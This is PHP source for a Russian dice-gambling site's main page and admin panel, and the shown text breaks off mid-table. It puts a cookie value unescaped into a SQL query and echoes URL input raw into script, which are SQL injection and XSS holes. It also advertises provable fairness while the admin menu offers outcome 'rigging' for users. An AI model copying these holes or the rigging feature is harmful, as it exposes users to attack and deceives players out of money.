<?php
include_once "inc/config.php";
include_once "inc/main.php";
$hashh = $_COOKIE["sid"];
$sql_selectadmin = "SELECT * FROM ".$prefix."_users WHERE hash='$hashh'";
$resultadmin = mysql_query($sql_selectadmin);
$rowadmin = mysql_fetch_array($resultadmin);
$prava = $rowadmin['admin'];
$x = mysql_query("SELECT * FROM ".$prefix."_config WHERE ID='1'");
$cf = mysql_fetch_assoc($x);
?>
    <!DOCTYPE html>

    <html lang="ru" >

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
	      <meta name="referrer" content="no-referrer">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
        <meta name="description" content="Что такое <?php echo $name_site ?>? Сервис мгновенных игр, где шанс выигрыша указываете сами. Быстрые выплаты без комиссий и прочих сборов.">
        <meta name="author" content="<?php echo $domain_site ?>">
        <title><?php echo $name_site; ?> - Сервис мгновенных игр, где шанс выигрыша указываете сами
        </title>
        <link rel="stylesheet" type="text/css" href="./files/palette-climacon.css">
        <!-- END PAGE VENDOR JS-->
        <!-- BEGIN STACK JS-->
        <link rel="stylesheet" type="text/css" href="./files/css.css" >
        <!-- BEGIN VENDOR CSS-->
        <link rel="stylesheet" type="text/css" href="./files/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="./files/style.minn.css">
        <link rel="stylesheet" type="text/css" href="./files/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="./files/flag-icon.min.css">
        <link rel="stylesheet" type="text/css" href="./files/morris.css">
        <link rel="stylesheet" type="text/css" href="./files/emoji.css">
        <link rel="icon" href="./files/<?php echo $favicon?>" type="image/x-icon">
    		<link rel="shortcut icon" href="./files/<?php echo $favicon?>" type="image/x-icon">
        <link rel="stylesheet" type="text/css" href="./files/climacons.min.css">
        <link rel="stylesheet" type="text/css" href="./files/loader-gg.css">
        <link rel="stylesheet" type="text/css" href="./files/redactor.css">
        <!-- END VENDOR CSS-->
        <!-- BEGIN STACK CSS-->
        <link rel="stylesheet" type="text/css" href="./files/bootstrap-extended.min.css">
        <link rel="stylesheet" type="text/css" href="./files/app.min.css">
        <link rel="stylesheet" type="text/css" href="./files/colors.min.css">
        <!-- END STACK CSS-->
        <!-- BEGIN Page Level CSS-->
        <link rel="stylesheet" type="text/css" href="./files/horizontal-menu.min.css">
        <link rel="stylesheet" type="text/css" href="./files/vertical-overlay-menu.min.css">
        <!-- link(rel='stylesheet', type='text/css', href='../../../app-assets/css#{rtl}/pages/users.css')-->
        <!-- END Page Level CSS-->
        <!-- BEGIN Custom CSS-->
        <link rel="stylesheet" type="text/css" href="./files/style.css">
        <!-- END Custom CSS-->
        <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1517812337239/recaptcha__ru.js"></script>
        <script src="./files/jquery-latest.min.js"></script>
	</head>
<?php
if($_GET['code'])
{
$token = json_decode(file_get_contents('https://oauth.vk.com/access_token?client_id='.$ID.'&display=page&redirect_uri='.$URL.'&client_secret='.$SECRET.'&code='.$_GET['code'].'&v=5.74'), true);
$data = json_decode(file_get_contents('https://api.vk.com/method/users.get?user_id='.$token['user_id'].'&v=5.74&access_token='.$token['access_token'].'&fields=first_name,last_name'), true);
$data = $data['response']['0'];
$first_name = $data['first_name'];
$last_name = $data['last_name'];
$code = $_GET['code'];
echo "<script>var code = '$code';var first = '$first_name';var last = '$last_name';</script>";
if(!$_COOKIE['sid'])
{
  echo <<<HTML
  <script>
  setTimeout(function(){
    $.ajax({
        type: 'POST',
        url: 'inc/engine.php',
        data: {
          type: 'vkauth',
          code: code,
          fname: first,
          lname: last
        },
        success: function(data) {
          var obj = jQuery.parseJSON(data);
          if (obj.success == 'success') {
            Cookies.set('sid', obj.sid, { expires: 365,path: '/',secure:true });
            Cookies.set('uid', obj.uid, { expires: 365,path: '/',secure:true });
            Cookies.set('login', obj.login, { expires: 365,path: '/',secure:true });
            window.location.href = '';
          }
        }
    });
  },500);
  </script>
HTML;
}
else
{
  echo <<<HTML
  <script>
    setTimeout(function(){
      $.ajax({
          type: 'POST',
          url: 'inc/engine.php',
          data: {
            type: 'vkconnect',
            code: code,
            fname: first,
            lname: last,
            sid: Cookies.get('sid')
          },
          success: function(data) {
            var obj = jQuery.parseJSON(data);
            if (obj.success == 'success') {
              $('#vk_success').show();
              $('#vk_success').html(obj.error);
              setTimeout(function(){
                $('#vk_success').hide();
              },7000);
              $('#vkupd').html('<a style="color:#3B5998" onclick="vkunconnect()" class="btn btn-social mb-1 mr-1 btn-outline-facebook"><span class="fa fa-vk"></span> <span class="px-1">Отвязать ВК</span></a>');
            }else{
              $('#vk_error').html(obj.error);
              $('#vk_error').show();
              setTimeout(function(){
                $('#vk_error').hide();
              },7000);
            }
          }
      });
    },500);
  </script>
HTML;
}
}
?>
    <body class="horizontal-layout horizontal-menu 2-columns    menu-expanded" style="background-image: url(img/<?php echo $bgc_site ?>);">
      <?php
      if($cf['preloader_active'] == '1')
      {
        echo '<div class="preloader">
            <div class="page-loader-circle"></div>
        </div>';
      }
      ?>
       <!-- navbar-fixed-top-->
        <nav style="background: #303030;border-radius: 0;" class="header-navbar navbar navbar-with-menu navbar-static-top navbar-light navbar-border navbar-brand-center" data-nav="brand-center">
            <div class="navbar-wrapper">
                <div class="navbar-header">
                    <ul class="nav navbar-nav">
                        <li class="nav-item mobile-menu hidden-md-up float-xs-left"><a href="" class="nav-link nav-menu-main menu-toggle hidden-xs">
						<i style="color: #fff;" id="menu-mob" class="ft-menu font-large-1"></i>
						</a></li>
                        <li class="nav-item">
                            <a href="" class="navbar-brand">
                            </center><h2 style="text-transform:uppercase;color: #fff;"><b id="s_name"><?php echo $name_site; ?></b></h2></a></center>
                        </li>

                    </ul>
                </div>

            </div>
        </nav>

        <!-- ////////////////////////////////////////////////////////////////////////////-->

        <!-- Horizontal navigation-->

        <div id="sticky-wrapper" class="sticky-wrapper h66" >
            <div role="navigation" data-menu="menu-wrapper" class="header-navbar navbar navbar-horizontal navbar-fixed navbar-light navbar-without-dd-arrow navbar-shadow menu-border navbar-brand-center" data-nav="brand-center">
                <!-- Horizontal menu content-->
<?php
echo $panel;
?>
				</div>
        </div>

        <div class="app-content container center-layout mt-2">
            <div class="content-wrapper">

                <div class="content-body">

<?php
echo $go;
?>


                                                        <div class="row dsec" id="lastBets" style="display:block">
                                        <div class="col-xs-12">
                                            <div class="card">
                                                <div  class="card-header"   style="border-radius: 4px!important;-webkit-user-select: none;-moz-user-select: none;">
                                                    <h4 class="card-title" style=""><b>Последние игры</b></h4> <div  style="margin-top: -13px;margin-left: 177px;display: inline-block;position: absolute;" class="circle-online pulse-online" ></div> <span data-toggle="tooltip" data-placement="top" title="" data-original-title="Online " id="oe" style="margin-top: -19px;margin-left: 193px;display: inline-block;position: absolute;"><?php echo $online; ?></span>


													<div class="heading-elements">
                                                        <ul class="list-inline mb-0">
                                                            <li><a data-action="collapse"><i class="ft-minus"></i></a></li>
                                                            <li><a data-action="reload"><i class="ft-rotate-cw"></i></a></li>
                                                        </ul>
                                                    </div>

                                                </div>
                                                <div class="card-body collapse in" style="-webkit-user-select: none;-moz-user-select: none; box-shadow: rgb(210, 215, 222) 7px 10px 23px -11px;" >

                                                    <div class="table-responsive">
                                                        <table class="table mb-0">
                                                            <thead>

                                                                <tr style="cursor:default!important" class="polew">
                                                                    <th style="width:20%" >Игрок</th>
                                                                    <th>Число</th>
                                                                    <th>Цель</th>
                                                                    <th style="width:14%">Сумма</th>
                                                                    <th>Шанс</th>
                                                                    <th>Выигрыш</th>
                                                                </tr>
                                                            </thead>
                                                            <tbody id="response"></tbody>
                                                        </table>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <section id="realGame" class="card dsec" style="display:none">
                                        <div  class="card-header"   style="border-radius: 4px!important;">
                                            <h4 class="card-title "><b>Абсолютно честно</b></h4>

                                        </div>
                                        <div class="card-body collapse in">
                                            <div class="card-block">
                                                <div class="card-text">
                                                    <p>Перед каждой игрой генерирутеся строка <a href="https://ru.wikipedia.org/wiki/SHA-2" target="_blank">алгоритмом SHA-512 </a> в которой содержится <a href="https://ru.wikipedia.org/wiki/%D0%A1%D0%BE%D0%BB%D1%8C_(%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%B3%D1%80%D0%B0%D1%84%D0%B8%D1%8F)" target="_blank">соль</a> и победное число (от 0 до 999999). Можно сказать, что перед Вами зашифрованный исход данной игры. Метод гарантирует <b>100% честность</b>, так как результат игры Вы видите заранее, а при изменении победного числа приведет к изменению Hash.</p>

                                                    Проверяйте самостоятельно:
                                                    <ul>
                                                        <li>Скоприруйте Hash до начала игры</li>
                                                        <li>После окончания нажмите <code class="highlighter-rouge">"Проверить игру"</code></li>
                                                        <li>Откроется окно с результатом</li>
                                                        <li>Скопируйте вручную поля c Победным числом</li>
                                                        <li>Вставьте в любой независимый SHA-512 генератор (Например: <a href="https://emn178.github.io/online-tools/sha512.html" target="_blank">Ссылка 1</a> <a href="https://www.md5calc.com/sha512" target="_blank">Ссылка 2</a> <a href="https://passwordsgenerator.net/sha512-hash-generator/" target="_blank">Ссылка 3</a>)</li>
                                                        <li>Hash должен совпадать c Hash до начала игры</li>

                                                    </ul>
                                                    Например:
                                                    <ul>
                                                        <li style="word-wrap: break-word;">Hash до начала игры: 9008354d492a2678fb81a33464a06f06ab6639998d4be7864d04acf3d72921962ad42fd86a9b5d985abe607de4de1cfcef526eefd1ab0e5de6bba6b69b6813e4 </li>
                                                        <li>Победное число: 366209</li>
														<li>После окончания нажали на "Проверить игру", открылось <a>окно</a></li>
                                                        <li>Копируем значения Победного числа</li>
                                                        <li>Получаем строку <code class="highlighter-rouge">366209</code></li>
                                                        <li>Вставляем строку в <a href="https://emn178.github.io/online-tools/sha512.html" target="_blank">генератор</a> </li>
                                                        <li>Получили hash как и до начала игры</li>

                                                    </ul>

                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                    <section id="rules" class="card dsec" style="display:none">
                                        <div  class="card-header"   style="border-radius: 4px!important;">
                                            <h4 class="card-title "><b>Очень простая игра</b></h4>

                                        </div>
                                        <div class="card-body collapse in">
                                            <div class="card-block">
                                                <div class="card-text">

                                                    <ul>
                                                        <li>Укажите размер ставки и свой шанс выигрыша. Будет показан возможный (расчетный) выигрыш от вашей ставки.</li>
                                                        <li>Выбираете промежуток больше или меньше.</li>
                                                        <li><a style="color: #00A5A8;" onclick="$('.dsec').hide();$('#realGame').show();$('#main-menu-navigation  li').removeClass('active');$('#gg').addClass('active');">Заранее генерируется число от 0 до 999 999</a>. Если число находится в пределах диапазона больше/меньше , который вы выбрали,вы выигрываете.</li>

                                                    </ul>

                                                </div>
                                            </div>
                                        </div>
                                    </section>
									<div class="row dsec" id="lastWithdraw" style="display:none">
                                        <div class="col-xs-12">
                                            <div class="card">
                                                <div class="card-header" style="border-radius: 4px!important;">
                                                    <h4 class="card-title"><b>Последние выплаты</b></h4>
                                                    <div class="nav-page">
                                                      <b id="pg_l"></b>
                                                      <input onkeyup="last_out()" type="text" id="pgi_l" placeholder="Стр" value="1"/>
                                                    </div>



                                                </div>
                                                <div class="card-body collapse in">

                                                    <div class="table-responsive">
                                                        <table class="table mb-0">
                                                            <thead>

                                                                <tr class="polew">
                                                                    <th>Логин</th>
                                                                    <th>Сумма</th>
                                                                    <th>Система</th>
                                                                    <th>Кошелек</th>
                                                                </tr>
                                                            </thead>
                                                            <tbody id="tableoutusers"></tbody>
					                                             </table>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
									<noindex><section id="contacts" class="card dsec" style="display:none">
                                        <div  class="card-header"   style="border-radius: 4px!important;">
                                            <h4 class="card-title "><b>Контакты</b></h4>

                                        </div>
                                        <div class="card-body collapse in">
                                            <div class="card-block">
                                                <div class="card-text">


                                                <?php echo $cf['site_contacts'] ?>




                                                </div>
                                            </div>
                                        </div>
                                    </section>

									<section id="referals" class="dsec"  style="display:none">
                                	<div class="row ">
                                        <div class="col-xs-12">
                                            <div class="card">
                                                <div  class="card-header"   style="border-radius: 4px!important;">
                                                    <h4 class="card-title "><b>Ваша реферальная ссылка: </b> <span id="myrefurl" style="text-transform:none!important"></span> <i id="sucCopy" style="display:none"class="ft-check"></i><i id="myrefurlcopy" onclick="$(this).hide();$('#sucCopy').show();setTimeout(function(){$('#sucCopy').hide();$('#myrefurlcopy').show();},2500);" class="ft-copy btn-clipboard" style="cursor:pointer" data-toggle="tooltip" data-placement="top" title="" data-original-title="Скопировать ссылку"></i></h4>

                                                </div>
                                                <div class="card-body collapse in">
												<div class="card-block card-dashboard">
                    Получайте 10% с каждого пополнения баланса реферала
                </div>

                                                    <div class="table-responsive">
                                                        <table class="table mb-0">
                                                       <thead id="thref"></thead>
                                                       <tbody id="tableref"></tbody>
                                                        </table>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    </section>
                                    <?php
                                    if($prava == 'sadmin')
                                    {
                                      $q = mysql_query("SELECT * FROM ".$prefix."_admin WHERE ID='1'");
                                      $rowin = mysql_fetch_assoc($q);
                                      $z = mysql_query("SELECT * FROM ".$prefix."_win WHERE ID='1'");
                                      $rowad = mysql_fetch_assoc($z);

                                      $bgc1 = <<<HERE
                                      <div id="bgc1" onclick="$('#bgc_site').val('bgc-memphis.png'); $('#bgc1Active').css('display','');$('#bgc2Active').hide();$('#bgc3Active').hide();$('#bgc2').css('opacity','0.55');$('#bgc3').css('opacity','0.55'); $('#bgc1').css('opacity','1');" style="cursor:pointer;margin-bottom:15px;">
                                       <img src="img/bgc-memphis.png" width="100%" height="160px"> <img id="bgc1Active" src="files/checked.png" style="position:absolute;display:none;" width="16px">
                                      </div>
HERE;
                                      $bgc2 = <<<HERE
                                      <div id="bgc2" onclick="$('#bgc_site').val('tehnology.png'); $('#bgc2Active').css('display','');$('#bgc1Active').hide();$('#bgc3Active').hide();$('#bgc1').css('opacity','0.55');$('#bgc3').css('opacity','0.55'); $('#bgc2').css('opacity','1');" style="cursor:pointer;margin-bottom:15px;">
                                       <img src="img/tehnology.png" width="100%" height="160px"> <img id="bgc2Active" src="files/checked.png" style="position:absolute;display:none;" width="16px">
                                      </div>
HERE;
                                      $bgc3 = <<<HERE
                                      <div id="bgc3" onclick="$('#bgc_site').val('programmer.jpg'); $('#bgc3Active').css('display','');$('#bgc1Active').hide();$('#bgc2Active').hide();$('#bgc1').css('opacity','0.55');$('#bgc2').css('opacity','0.55'); $('#bgc3').css('opacity','1');" style="cursor:pointer;margin-bottom:15px;">
                                       <img src="img/programmer.jpg" width="100%" height="160px"> <img id="bgc3Active" src="files/checked.png" style="position:absolute;display:none;" width="16px">
                                      </div>
HERE;

                                      $main = <<<HERE
                                      <a style="color:#00A5A8;" onclick="settings_site();">Сохранить настройки</a><br/>
                                      <a style="color:red;" onclick="$('#main-adm').hide();$('#set-site').show();">Вернуться назад</a>
HERE;

                                      $return_info = <<<HERE
                                      <a style="color:red;" onclick="$('#info_edit_user').hide();$('#infouser').show();">Вернуться назад</a>
HERE;

                                      $new_promo = <<<HERE
                                      <a onclick="$('.dsec').hide();$('#cr-promo').show();" style="text-transform: initial;color:#00A5A8;">Создать</a>
HERE;

                                      $return_promo = <<<HERE
                                      <a style="color:red;" onclick="$('#adm-promo').hide();$('#set-site').show();">Вернуться назад</a>
HERE;

                                      $show = <<<HERE
                                      <a style="color:red;" onclick="$('#show_active').hide();$('#adm-promo').show();upd_adm();">Вернуться назад</a>
HERE;

                                      $out = <<<HERE
                                      <a style="color:red;" onclick="$('#out-adm').hide();$('#set-site').show();">Вернуться назад</a>
HERE;
                                      $perevod_qiwi = <<<HERE
                                      <a class="btn  btn-block" style="color:#fff;background: #6c7a89!important;" onclick="perevod_qiwi()">

HERE;

                                      $ch_qiwi = <<<HERE
                                      <a class="btn  btn-block" style="color:#fff;background: #6c7a89!important;" onclick="check_qiwi()">

HERE;
                                      $out_adm = <<<HERE
                                      <a class="btn  btn-block" style="color:#fff;background: #6c7a89!important;" onclick="adm_out()">

HERE;

                                      $create_promo = <<<HERE
                                      <a style="color:#00A5A8;" onclick="create_promo();">Сохранить настройки</a><br/>
                                      <a style="color:red;" onclick="$('#cr-promo').hide();$('#adm-promo').show();upd_adm();">Вернуться назад</a>
HERE;

                                      $opl = <<<HERE
                                      <a style="color:#00A5A8;" onclick="save_oplata();">Сохранить настройки</a><br/>
                                      <a style="color:red;" onclick="$('#set-oplata').hide();$('#set-site').show();">Вернуться назад</a>
HERE;
                                      $pod = <<<HERE
                                      <a style="float:right;color:#00A5A8;position: absolute;top: 20px;right: 20px;" onclick="obnul_pod();">Сброс</a>
                                      <a style="color:#00A5A8;" onclick="save_pd();">Сохранить настройки</a><br/>
                                      <a style="color:red;" onclick="$('#pod-users').hide();$('#set-site').show();">Вернуться назад</a>
HERE;
                                      echo <<<HERE
                                      <section id="set-site" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Настройки сайта</b></h4>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="col-lg-12">
                                                          <div class="menu-set">
                                                            <a onclick="$('.dsec').hide();$('#main-adm').show();" style="color: #00A5A8;">Главная страница</a>
                                                            <a onclick="$('.dsec').hide();$('#set-oplata').show();" style="color: #00A5A8;">Настройка оплаты</a>
                                                            <a onclick="$('.dsec').hide();$('#out-adm').show();" style="color: #00A5A8;">Вывод средств</a>
                                                            <a onclick="upd_adm();$('.dsec').hide();$('#adm-promo').show();" style="color: #00A5A8;">Промокоды</a>
                                                            <a onclick="$('.dsec').hide();$('#pod-users').show();" style="color: #00A5A8;">Подкрутка юзерам</a>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
HERE;
                                      echo '<section id="adm-users" class="dsec"  style="display:none">
                                        <div class="row">
                                      		<div class="col-xs-12">
                                      			<div class="card">
                                      				<div  class="card-header" style="border-radius: 4px!important;">
                                      					<h4 class="card-title "><b>Пользователи</b><input onkeyup="search_user()" type="text" id="search_u" placeholder="Поиск"/></h4>
                                                <div class="nav-page">
                                                  <b id="pg_u"></b>
                                                  <input onkeyup="upd_adm()" type="text" id="pgi_u" placeholder="Стр" value="1"/>
                                                </div>
                                      				</div>
                                      				<div class="card-body collapse in">
                                      					<div class="table-responsive">
                                      						<table class="table mb-0">
                                      							<thead>
                                      							<tr>
                                      								<th class="text-xs-center">ID</th>
                                      								<th class="text-xs-center">Логин</th>
                                                      <th class="text-xs-center">Баланс</th>
                                      								<th class="text-xs-center">Дата рег.</th>
                                      								<th class="text-xs-center">IP[Рег]</th>
                                      								<th class="text-xs-center">IP</th>
                                      							</tr>
                                      							</thead>
                                      							<tbody id="tableusers"></tbody>
                                                  </table>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </section>
                                      <section id="main-adm" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Главная</b></h4>
                                              '.$main.'
                                              <a id="main_success" class="btn  btn-block btnSuccess" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <input type="hidden" id="bgc_site" value="'.$cf['bgc_site'].'"/>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Название сайта</label>
                                                            <input type="text" class="form-control" id="site_name" placeholder="Название сайта" value="'.$cf['site_name'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Домен сайта</label>
                                                            <input type="text" class="form-control" id="site_domain" placeholder="Домен сайта" value="'.$cf['site_domain'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Ссылка на сайт</label>
                                                            <input type="url" class="form-control" id="site_url" placeholder="Ссылка на сайта" value="'.$cf['site_url'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Футер сайта</label>
                                                            <input type="text" class="form-control" id="site_footer" placeholder="Футер сайта" value="'.$cf['site_footer'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                          <label>Фон Memphis</label>
                                                            '.$bgc1.'
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                          <label>Фон Tehnology</label>
                                                            '.$bgc2.'
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                          <label>Фон Programmer</label>
                                                            '.$bgc3.'
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Мин пополнение</label>
                                                            <input type="number" class="form-control" id="input_f" placeholder="Сумма" value="'.$cf['input_f'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Мин вывод</label>
                                                            <input type="number" class="form-control" id="out_f" placeholder="Сумма"value="'.$cf['out_f'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Макс пополнение</label>
                                                            <input type="number" class="form-control" id="inputmax_f" placeholder="Сумма" value="'.$cf['inputmax_f'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Макс вывод</label>
                                                            <input type="number" class="form-control" id="outmax_f" placeholder="Сумма" value="'.$cf['outmax_f'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Бонус при регистрации</label>
                                                            <input type="number" class="form-control" id="bonus_reg" placeholder="Сумма" value="'.$cf['bonus_reg'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Валюта сайта</label>
                                                            <input type="text" class="form-control" id="wallet_site" placeholder="Валюта" value="'.$cf['wallet'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>ИД группы ВК</label>
                                                            <input type="number" class="form-control" id="vk_group_id" placeholder="ID группы" value="'.$cf['vk_group_id'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Токен группы ВК</label>
                                                            <input type="text" class="form-control" id="vk_group_token" placeholder="Токен группы" value="'.$cf['vk_group_token'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>ИД приложения ВК</label>
                                                            <input type="number" class="form-control" id="vk_id" placeholder="ИД приложения" value="'.$cf['vk_id'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <label>Токен приложения ВК</label>
                                                            <input type="text" class="form-control" id="vk_secret" placeholder="Токен приложения" value="'.$cf['vk_secret'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Ваш Qiwi</label>
                                                            <input type="number" id="qiwi_num" class="form-control" placeholder="Номер Qiwi без(+)" value="'.$phone.'"/>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Токен Qiwi</label>
                                                            <input type="text" id="qiwi_token" class="form-control" placeholder="Токен Qiwi" value="'.$token.'"/>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Прелоадер</label>
                                                            <select class="form-control" id="active_preloader">
                                                              <option value="'.$cf['preloader_active'].'">Изменить</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Qiwi(Оплата)</label>
                                                            <select class="form-control" id="active_qiwi">
                                                              <option value="'.$cf['qiwi_active'].'">Изменить</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Free-Kassa(Оплата)</label>
                                                            <select class="form-control" id="active_fk">
                                                              <option value="'.$cf['freekassa_active'].'">Изменить</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-3">
                                                          <div class="form-group">
                                                            <label>Payeer(Оплата)</label>
                                                            <select class="form-control" id="active_payeer">
                                                              <option value="'.$cf['payeer_active'].'">Изменить</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-4">
                                                          <div class="form-group">
                                                            <label>Мин шанс выйгрыша</label>
                                                            <input type="number" id="minBetPercent" class="form-control" placeholder="Мин шанс выйгрыша" value="'.$minBetPercent.'"/>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-4">
                                                          <div class="form-group">
                                                            <label>Макc шанс выйгрыша</label>
                                                            <input type="number" id="maxBetPercent" class="form-control" placeholder="Макc шанс выйгрыша" value="'.$maxBetPercent.'"/>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-4">
                                                          <div class="form-group">
                                                            <label>Мин ставка для игры</label>
                                                            <input type="number" id="betSizeMin" class="form-control" placeholder="Мин ставка для игры" value="'.$betSizeMin.'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-6" style="margin-bottom:10px;">
                                                            <label>Главная информация</label>
                                                            <textarea class="form-control" placeholder="Информация" id="site_info" rows="5">'.$cf['site_info'].'</textarea>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-6" style="margin-bottom:10px;">
                                                            <label>Контакты</label>
                                                            <textarea class="form-control" placeholder="Контакты" id="site_contacts" rows="5">'.$cf['site_contacts'].'</textarea>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="cr-promo" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Новый промокод</b></h4>
                                              '.$create_promo.'
                                              <a id="promo_success" class="btn  btn-block btnSuccess" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                              <a id="promo_error" class="btn  btn-block btnError" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>Название промокода</label>
                                                            <input type="text" class="form-control" id="name_promo" placeholder="Промокод"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>Макс активаций</label>
                                                            <input type="number" class="form-control" id="max_promo" placeholder="Число"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>Сумма за активацию ( '.$walletsite.' )</label>
                                                            <input type="number" class="form-control" id="sum_promo" placeholder="Сумма"/>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="adm-promo" class="dsec"  style="display:none">
                                        <div class="row">
                                      		<div class="col-xs-12">
                                      			<div class="card">
                                      				<div  class="card-header" style="border-radius: 4px!important;">
                                      					<h4 class="card-title "><b>Промокоды</b> ('.$new_promo.')</h4>
                                                '.$return_promo.'
                                                <div class="nav-page">
                                                  <b id="pg_promo"></b>
                                                  <input onkeyup="upd_adm()" type="text" id="pgi_promo" placeholder="Стр" value="1"/>
                                                </div>
                                      				</div>
                                      				<div class="card-body collapse in">
                                      					<div class="table-responsive">
                                                  <table class="table mb-0">
                                                    <thead>
                                                    <tr>
                                                      <th class="text-xs-center">ID</th>
                                                      <th class="text-xs-center">Промокод</th>
                                                      <th class="text-xs-center">Кол-во активаций</th>
                                                      <th class="text-xs-center">Макс кол-во активаций</th>
                                                      <th class="text-xs-center">Активировали</th>
                                                      <th class="text-xs-center">Сумма( '.$walletsite.' )</th>
                                                    </tr>
                                                    </thead>
                                                    <tbody id="tablepromo"></tbody>
                                                  </table>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </section>
                                      <div class="row dsec" id="lastout" style="display:none">
                                      <div class="col-xs-12">
                                      <div class="card">
                                      <div class="card-header" style="border-radius: 4px!important;">
                                      <h4 class="card-title"><b>Последние выплаты</b></h4>
                                      <div class="nav-page">
                                        <b id="pg_o"></b>
                                        <input onkeyup="upd_adm()" type="text" id="pgi_o" placeholder="Стр" value="1"/>
                                      </div>
                                      </div>
                                      <div class="card-body collapse in">

                                      <div class="table-responsive">
                                      <table class="table mb-0">
                                      <thead>

                                      <tr class="polew">
                                      <th style="text-align:center;">Логин</th>
                                      <th style="text-align:center;">Сумма</th>
